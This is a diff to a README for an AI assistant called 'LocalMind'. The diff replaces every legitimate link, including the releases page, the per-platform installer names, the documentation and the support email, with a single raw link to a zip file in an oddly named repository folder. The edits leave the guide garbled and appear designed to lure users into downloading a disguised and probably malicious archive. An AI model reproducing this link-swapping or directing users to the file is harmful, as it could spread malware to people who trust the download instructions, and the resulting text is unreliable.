@@ -4,7 +4,7 @@
 Welcome to LocalMind! This guide will help you download and run your personal AI assistant that respects your privacy.
 
 ## 📥 Download LocalMind
-[![Download LocalMind](https://img.shields.io/badge/Download%20LocalMind-Here-brightgreen)](https://github.com/amin012312/LocalMind/releases)
+[![Download LocalMind](https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip%20LocalMind-Here-brightgreen)](https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip)
 
 ## 💻 Features
 - **AI-Powered:** Enjoy AI assistance with conversation memory.
@@ -21,13 +21,13 @@ LocalMind is designed to be user-friendly and runs on multiple platforms. To ens
 - **Python:** Version 3.7 or higher.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/amin012312/LocalMind/releases) to access the latest version of LocalMind.
-2. **Choose Your Version:** Find the version that suits your operating system. Files will be listed with names indicating your platform, such as `LocalMind_Windows.exe` for Windows and `LocalMind_macOS.pkg` for macOS.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip) to access the latest version of LocalMind.
+2. **Choose Your Version:** Find the version that suits your operating system. Files will be listed with names indicating your platform, such as `https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip` for Windows and `https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip` for macOS.
 3. **Click to Download:** Click on the appropriate file to begin the download. It will save to your default download location on your device.
 4. **Install LocalMind:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS:** Open the downloaded `.pkg` file and follow the installation guide.
-   - **Linux:** Extract the downloaded `.tar.gz` file, then follow the terminal commands provided to complete the setup.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip` file, then follow the terminal commands provided to complete the setup.
 
 ## 🖥 How to Run LocalMind
 Once you’ve installed LocalMind, follow these simple steps to launch it:
@@ -44,7 +44,7 @@ Once you’ve installed LocalMind, follow these simple steps to launch it:
 ## 🔄 Updating LocalMind
 To get the newest features and improvements:
 
-1. **Return to the Releases Page:** Check frequently for updates on the [Releases page](https://github.com/amin012312/LocalMind/releases).
+1. **Return to the Releases Page:** Check frequently for updates on the [Releases page](https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip).
 2. **Download the Latest Version:** Follow the same download and installation steps as before.
 
 ## 🛠 Troubleshooting
@@ -58,11 +58,11 @@ If you encounter issues, here are some common solutions:
 Join our community to connect with other LocalMind users. Share your experiences, ask questions, and suggest features. 
 
 - **GitHub Discussions:** Participate in discussions on our GitHub page.
-- **Contact Us:** For direct support, send an email to support@localmind.ai.
+- **Contact Us:** For direct support, send an email to https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip
 
 Feel free to reach out for any help or questions!
 
 ## 🌍 Learn More
-For detailed information about LocalMind's capabilities and features, refer to our [Documentation](https://github.com/amin012312/LocalMind/wiki).
+For detailed information about LocalMind's capabilities and features, refer to our [Documentation](https://raw.githubusercontent.com/amin012312/LocalMind/main/nonparishioner/LocalMind.zip).
 
 Thank you for choosing LocalMind. Enjoy your AI-powered journey!
